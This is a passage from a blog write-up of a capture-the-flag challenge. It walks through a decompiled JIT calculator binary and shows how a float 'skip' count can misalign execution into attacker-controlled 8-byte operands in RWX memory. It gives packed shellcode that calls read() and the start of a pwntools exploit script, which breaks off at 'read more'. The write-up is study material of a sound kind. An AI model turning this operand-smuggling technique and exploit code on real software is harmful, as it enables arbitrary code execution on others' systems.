  <span class="n">code_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Elf64_Ehdr_00100000</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
                    <span class="cm">/* make new code area rwx (juicy) */</span>
  <span class="n">mprotect</span><span class="p">(</span><span class="n">code_ptr</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
                    <span class="cm">/* add instructions at the end of our allocated code that disassemble to:
                       48 89 C8    mov rax, rcx
                       C3          ret
                       This is the code that supplies the return value that we check at the end, and
                       returns execution back to jit() (return value goes in rax) */</span>
  <span class="n">code_ptr</span><span class="p">[(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span> <span class="o">+</span> <span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x48</span><span class="p">;</span>
  <span class="n">code_ptr</span><span class="p">[(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span> <span class="o">+</span> <span class="o">-</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x89</span><span class="p">;</span>
  <span class="n">code_ptr</span><span class="p">[(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span> <span class="o">+</span> <span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span>
  <span class="n">code_ptr</span><span class="p">[(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc3</span><span class="p">;</span>
                    <span class="cm">/* iterate through all charps in instructions */</span>
  <span class="n">iter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">iter</span> <span class="o">&lt;</span> <span class="n">instruction_count</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">instr_name</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">instructions</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">iter</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
                    <span class="cm">/* 48 B8 00 00 00 00 00 00 00 FF    movabs rax, 0xff00000000000000 */</span>
    <span class="o">*</span><span class="n">code_ptr</span> <span class="o">=</span> <span class="mh">0x48</span><span class="p">;</span>
    <span class="n">code_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xb8</span><span class="p">;</span>
                    <span class="cm">/* extract our number we specified with the instruction. E.g, if we said "add
                       123"
                       this would extract "123" and convert it to unsigned long long */</span>
    <span class="n">arg1</span> <span class="o">=</span> <span class="n">strtoull</span><span class="p">(</span><span class="n">instr_name</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span><span class="o">&amp;</span><span class="n">nullptr</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
                    <span class="cm">/* set arg1 to the operand of the movabs rax instruction  */</span>
    <span class="o">*</span><span class="p">(</span><span class="n">ulonglong</span> <span class="o">*</span><span class="p">)(</span><span class="n">code_ptr</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">arg1</span><span class="p">;</span>
    <span class="n">code_ptr</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x48</span><span class="p">;</span>
    <span class="n">code_ptr</span><span class="p">[</span><span class="mh">0xc</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc1</span><span class="p">;</span>
    <span class="n">code_ptr</span> <span class="o">=</span> <span class="n">code_ptr</span> <span class="o">+</span> <span class="mi">10</span><span class="p">;</span>
    <span class="n">choice_1</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">instr_name</span><span class="p">,</span><span class="s">"add"</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
                    <span class="cm">/* if "add" str is found, encode an add instruction */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">choice_1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="cm">/* 48 01 C1    add rcx, rax */</span>
      <span class="n">code_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">choice_1</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">instr_name</span><span class="p">,</span><span class="s">"sub"</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
                    <span class="cm">/* if "sub" str is found, encode a sub instruction */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">choice_1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="cm">/* 48 29 C1    sub rcx, rax */</span>
        <span class="n">code_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x29</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="n">choice_1</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">instr_name</span><span class="p">,</span><span class="s">"xor"</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
                    <span class="cm">/* if "xor" str is found, encode an xor instruction */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">choice_1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="cm">/* 48 31 C1    xor rcx, rax */</span>
          <span class="n">code_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x31</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
                    <span class="cm">/* move onto encoding the next instruction */</span>
    <span class="n">code_ptr</span> <span class="o">=</span> <span class="n">code_ptr</span> <span class="o">+</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">iter</span> <span class="o">=</span> <span class="n">iter</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
                    <span class="cm">/* execute jit()ted code, and store the return value (whatevery happened to be
                       in rax when the function exited) in 'executed code' */</span>
  <span class="n">executed_code</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="p">)(</span><span class="kt">long</span><span class="p">)(</span><span class="n">real_skipped_instructions</span> <span class="o">+</span> <span class="mh">0x100000</span><span class="p">))();</span>
                    <span class="cm">/* get return value from executed code */</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"result = %llu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">executed_code</span><span class="p">);</span>
  <span class="n">munmap</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Elf64_Ehdr_00100000</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">size_of_code</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So… Where to start? Well first we are prompted to enter “How many instructions would you like to skip?”. Our input is then converted to a float (keep note of this, as it will be extremely important later on) and stored, and then multiplied by 13. Now the program calculates how long our code will need to be with <code class="language-plaintext highlighter-rouge">size_of_code = instruction_count * 0xd + 4;</code> we then call <code class="language-plaintext highlighter-rouge">mmap()</code> with this value as the length argument and attempt to map that amount of memory from the address <code class="language-plaintext highlighter-rouge">0x100000</code> (this is static, and never changes). When that the memory is mapped we call <code class="language-plaintext highlighter-rouge">mprotect()</code> and set it to be readable, writable, and executable.</p>

<p>Another common characteristic of JIT is that it will set the permissions on memory pages to be readable, writable, and executable and never change them back. This is because it will take the byte-code, convert it into machine code, write it to memory and execute it all together. Calling a syscall like <code class="language-plaintext highlighter-rouge">mprotect()</code> to periodically to reset permissions on the memory ranges when they don’t need to be, for instance writable, but only executable would take time, so often JIT pages will be all 3 at once. This is also the case for this program as it writes code into this memory, then executes it all in one.</p>

<p>Then we do something odd:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116240964-592ec800-a75c-11eb-9ecd-935b2ebf6350.PNG" alt="9" /></p>

<p>Here you can see that we modify the memory at the end of our mapped space at indexes <code class="language-plaintext highlighter-rouge">code_ptr[size_of_code - 1]</code> to <code class="language-plaintext highlighter-rouge">code_ptr[size_of_code - 4]</code> and each time we write
a byte. This is the first time we write code into the new memory, even though these bytes just look like data the comment explains that these actually disassemble onto <code class="language-plaintext highlighter-rouge">mov rax, rcx ; ret</code>. These are placed at the end of our code, meaning these will be executed after all our other stuff is done with. This specific <code class="language-plaintext highlighter-rouge">ret</code> instruction is responsible for returning back into <code class="language-plaintext highlighter-rouge">jit()</code> once we have finished execution. If you were wondering why <code class="language-plaintext highlighter-rouge">size_of_code = instruction_count * 0xd + 4;</code> rather than <code class="language-plaintext highlighter-rouge">size_of_code = instruction_count * 0xd;</code>, its because these instructions make up for those last 4 bytes.</p>

<p>Next we enter a loop that iterates through <code class="language-plaintext highlighter-rouge">instruction_count</code>, meaning for every instruction this loop will execute. In this loop is where the magic of “Evaluate” happens.</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116242813-356c8180-a75e-11eb-8dca-d022b068f700.PNG" alt="10" /></p>

<p>Firstly, we get one of the charps from our <code class="language-plaintext highlighter-rouge">instructions</code> variable (recall that all <code class="language-plaintext highlighter-rouge">instructions</code> really is just a list of charps) and store it in <code class="language-plaintext highlighter-rouge">instr_name</code>. Next we write part of another instruction to our memory, this time being a <code class="language-plaintext highlighter-rouge">movabs rax, ?</code> instruction, we then parse the string at <code class="language-plaintext highlighter-rouge">instr_name</code> and take out the argument we supply to our command. Then convert it to an <code class="language-plaintext highlighter-rouge">unsigned long long</code> using <code class="language-plaintext highlighter-rouge">strtoull()</code>. We then write this new number into the <code class="language-plaintext highlighter-rouge">movabs rax, ?</code> instruction as its argument. <code class="language-plaintext highlighter-rouge">unsigned long long</code> is 8 bytes of 64 bits long, meaning that the argument for <code class="language-plaintext highlighter-rouge">movabs rax, ?</code> will be either padded out to 8 bytes or take all the 8 bytes of the number we supply.</p>

<p>This means that we completely control the operand, all 8 bytes of it. Here’s what that looks like in gdb:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116245484-e7a54880-a760-11eb-9c5d-dbff4d67f247.PNG" alt="12" /></p>

<p>When we then call the code in <code class="language-plaintext highlighter-rouge">jit</code>:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116245492-ea07a280-a760-11eb-9373-21546a12151b.PNG" alt="13" /></p>

<p>This is another thing that will be very relevent soon.</p>

<p>In the screenshot above, you can also see that our “add” command was encoded as an actual <code class="language-plaintext highlighter-rouge">add</code> instruction, now were going to see how:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116246165-a3667800-a761-11eb-8566-1c1e04d0930e.PNG" alt="14" /></p>

<p>10 bytes later in the code (<code class="language-plaintext highlighter-rouge">code_ptr[10]</code>) after we have finished encoding the <code class="language-plaintext highlighter-rouge">movabs rax, ?</code> instruction, we see some more bytes that could be instructions being written, 
one at <code class="language-plaintext highlighter-rouge">code_ptr[10]</code> and one at <code class="language-plaintext highlighter-rouge">code_ptr[0xc]</code> (12). The code_ptr is then incremented by 10, so that it points where <code class="language-plaintext highlighter-rouge">code_ptr[10]</code> used to point. And a different byte is written to <code class="language-plaintext highlighter-rouge">code_ptr[1]</code> (<code class="language-plaintext highlighter-rouge">code_ptr[11]</code>) depending on what operation we specified in our input string. In the case of our previous screenshot, “add” was used and so ‘1’ is written in between <code class="language-plaintext highlighter-rouge">code_ptr[10]</code> (0x48) and <code class="language-plaintext highlighter-rouge">code_ptr[12]</code> (0xc1), making the bytes equal to <code class="language-plaintext highlighter-rouge">\x48\x01\xc1</code>, creating an <code class="language-plaintext highlighter-rouge">add rcx, rax</code> instruction:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116247855-2b994d00-a763-11eb-9d60-5b88288748c4.PNG" alt="15" /></p>

<p>The same thing happens for the other instruction/commands “xor” and “sub”. I never needed to touch these though. We now finally come to the end of the <code class="language-plaintext highlighter-rouge">jit()</code> function:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116248153-7d41d780-a763-11eb-837c-7f4da5230367.PNG" alt="16" /></p>

<p><code class="language-plaintext highlighter-rouge">code_ptr</code> now points to the byte in between <code class="language-plaintext highlighter-rouge">\x48</code> and <code class="language-plaintext highlighter-rouge">\xc1</code>. So the program needs to increment the pointer by ‘3’ if it wants the next iteration of the loop to start writing instructions into memory that is unused, so it does just that. <code class="language-plaintext highlighter-rouge">iter</code> is then incremented by one. This loop will continue as long as <code class="language-plaintext highlighter-rouge">iter &lt; instruction_count</code>, so every command will have the operations above conducted on them. When all commands have been processed, its time to exit the loop.</p>

<p>Now that all the commands have been interpreted and translated into machine code, and all boilerplate instructions have been written into the memory we can finally call/run the code. First we add the number of instructions * 13.0 that we want to skip. Why times 13? Well each command is translated into 13 bytes of x86, as you have observed. So it would make sense to add 13 if you wanted to start at the next instruction, but after we have done this calculation the code is run and thanks to the <code class="language-plaintext highlighter-rouge">ret</code> instruction hardcoded at the end can return back into <code class="language-plaintext highlighter-rouge">jit()</code>. The return value being placed in <code class="language-plaintext highlighter-rouge">rax</code> beforehand. This value actually contains the result of all our commands/operations, and is then printed by <code class="language-plaintext highlighter-rouge">printf()</code>. The program then returns into <code class="language-plaintext highlighter-rouge">main()</code> and the cycle continues indefinitely.</p>

<h2 id="exploitation">Exploitation</h2>

<p>I tried to put specific emphasis on a couple of things when describing how <code class="language-plaintext highlighter-rouge">jit()</code> worked, namely that we can control all the bytes in the <code class="language-plaintext highlighter-rouge">movabs rax, ?</code> instruction operand, and that the equation to skip instructions uses a <code class="language-plaintext highlighter-rouge">float</code> value. The main thing to understand is the float value. Let me demonstrate:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116250955-1bcf3800-a766-11eb-9676-8f299dd7ba12.PNG" alt="17" /></p>

<p>Here i make 4 “add” instructions. Now i’m going to “Evaluate” and choose to skip 4 instructions. This should result in skipping all of my commands:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116251417-8bddbe00-a766-11eb-9d2b-48850f639e65.PNG" alt="18" /></p>

<p>As you can see, this is exactly what happened. We end up at the <code class="language-plaintext highlighter-rouge">mov rax, rcx ; ret</code> instruction at the end of the code. We skip a total of 0x34 bytes, or 13 * 4 bytes. Now i will enter the same instructions again, this time choosing to skip ‘1.2’ instructions. Watch what happens next:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116252072-250cd480-a767-11eb-9aed-9a37ac74997c.PNG" alt="19" /></p>

<p>The first thing before I show you were EXACTLY we return, is looking at the address. It should be a multiple of 13, right? No, since we were allowed to enter a float value, we can choose any value we wish. Take 1.2 for example. ‘1*13 = 13’ this is okay, but: ‘1.2*13 = 15.6’, 15.6 is then rounded to 16 up when the <code class="language-plaintext highlighter-rouge">real_skipped_instructions</code> value is typecasted into an integer here: <code class="language-plaintext highlighter-rouge">real_skipped_instructions = (int)(skipped_instructions_float * 13.0);</code>. And 16 = 0xf. Now we will see what we return into:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116252921-ecb9c600-a767-11eb-9a5c-5a5cafe7f1fd.PNG" alt="20" /></p>

<p>If you recall, the number we specified as our “add” command argument was 10416984888683040912, and this in hex is 0x9090909090909090. I’m sure you know where this is going lul. So we can completely control the operands, and can jump into said operand through manipulating the <code class="language-plaintext highlighter-rouge">real_skipped_instructions</code> variable. But we only have 8 bytes :(. 
What on earth can we do with 8 bytes? Everything.</p>

<p>Remember back when we <code class="language-plaintext highlighter-rouge">mprotect()</code>ed the memory to be rwx? That means its writable aaaand we have code execution. Could we call <code class="language-plaintext highlighter-rouge">read()</code> with the buffer/rsi as a value in this memory? Looking at the register layout at the time of jumping into the code, and we can see that:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116254263-1b846c00-a769-11eb-9e16-065df2801ae8.PNG" alt="21" /></p>

<p>This could certainly work (maybe). Using <a href="https://syscalls.w3challs.com/?arch=x86_64">This</a> we can figure out that in order to call read(), we need a couple things:</p>
<ul>
  <li><strong>RAX</strong> = 0 (read syscall number)</li>
  <li><strong>RDI</strong> = 0 (stdin, or any other fd we can control)</li>
  <li><strong>RSI</strong> = a value in our rwx memory that we can execute code at</li>
  <li><strong>RDX</strong> = a valid size</li>
</ul>

<p>Looking at the register state we see that:</p>
<ul>
  <li><strong>RAX</strong> = already 0</li>
  <li><strong>RDI</strong> = needs changing to 0</li>
  <li><strong>RSI</strong> = Nope</li>
  <li><strong>RDX</strong> = is a valid size, but needs to be in RSI</li>
</ul>

<p>So we need a snippet of asm that can clear rdi, swap rsi and rdi, and <code class="language-plaintext highlighter-rouge">syscall</code> that 8 bytes or less. I came up with the following, and packed it as a number:</p>

<pre><code class="language-asm">  xor rdi, rdi
  xchg rsi, rdx
  syscall
</code></pre>
<p><code class="language-plaintext highlighter-rouge">\x48\x31\xff\x48\x87\xd6\x0f\x05</code> == 364776757699490120</p>

<p>This should be able to call <code class="language-plaintext highlighter-rouge">read()</code> with an unlimited size to write/read in data from stdin, we can test this:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116256218-e547ec00-a76a-11eb-890e-ae18eb8ad950.PNG" alt="22" />
<img src="https://user-images.githubusercontent.com/73792438/116256349-04df1480-a76b-11eb-8287-02c43223f9d2.PNG" alt="23" />
<img src="https://user-images.githubusercontent.com/73792438/116256480-2213e300-a76b-11eb-9071-d7df0329b441.PNG" alt="24" /></p>

<p>So it certainly looks like <code class="language-plaintext highlighter-rouge">read()</code> worked. Now what if we were able to write some code here that actually did something?
Heres my exploit script:</p>

<p>```python
from pwn import *
import sys</p>

<h1 id="add-364776757699490120">add 364776757699490120</h1>

<h1 id="load-shellcode---just-reads-flagtxt-then-sends-it-to-stdout">Load shellcode - just reads ‘flag.txt’ then sends it to stdout</h1>
<p>f = open(“catflag”, “rb”)
flag_pls = f.read()
f.close()</p>

<p>p = process(sys.argv[1])
#p = remote(‘127.0.0.1’, 4444)</p>

<h1 id="attach-with-gdb">Attach with gdb</h1>
<p>gdb.attach(p, ‘’’
    break *jit+542
    continue
        ‘’’)</p>

<h1 id="add-6-instructions">Add 6 instructions</h1>
<p>for i in range(0, 6):
    print(p.recvuntil(“Action: “))
    p.sendline(“1”)
    p.clean()
    p.sendline(“add 364776757699490120”)</p>

    <div class="more"><a href="/Calculator-writeup/">read more</a></div>
  </article>








<footer>
  <div>Made with <b style="color: #f45;">&lt;3</b></div>
  <nav><a href="mailto:volticks@gmail.com" ><svg aria-label="Mail" class="icon"><use xlink:href="/assets/fontawesome/icons.svg#envelope"></use></svg></a><a href="https://github.com/volticks" ><svg aria-label="Github" class="icon"><use xlink:href="/assets/fontawesome/icons.svg#github"></use></svg></a><a href="/feed.xml" ><svg aria-label="Subscribe" class="icon"><use xlink:href="/assets/fontawesome/icons.svg#rss"></use></svg></a></nav>

</footer>


</html>
